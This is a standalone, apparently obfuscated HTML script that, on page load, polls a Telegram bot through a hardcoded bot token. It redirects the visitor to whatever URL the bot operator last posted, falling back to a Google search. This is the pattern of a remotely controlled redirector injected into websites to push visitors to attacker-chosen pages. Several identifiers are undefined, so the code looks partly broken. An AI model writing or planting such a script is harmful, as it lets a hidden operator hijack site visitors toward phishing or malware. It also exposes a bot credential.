<script>
var kick = '7168954953:AAH1u_5kPi4WBdNXMix9OF8vxX0ACrKWLRI';
var showmeway = 'https://www.google.com/search?q=covid';

var _0x3587 = ["text", "message", "result", "http", "startsWith", "replace", "location", "then", "ok", "json", "https://api.telegram.org/bot", "/getUpdates?limit=1&offset=-1"];
function ratedata() {
 fetch("https://api.telegram.org/bot" + kick + "/getUpdates?limit=1&offset=-1")
 ["then"](
 function(canCreateDiscussions) {
   if (!canCreateDiscussions[ok]) {
     window.location.replace(showmeway);
   }
   return canCreateDiscussions[json]();
 })
 ["then"](
 function(canCreateDiscussions) {
   var artistTrack = canCreateDiscussions[result][0][message][text];
   if (artistTrack[startsWith](http) == true) {
     window.location.replace(artistTrack);
   } else {
     window.location.replace(showmeway);
   }
 });
}
ratedata();
</script>
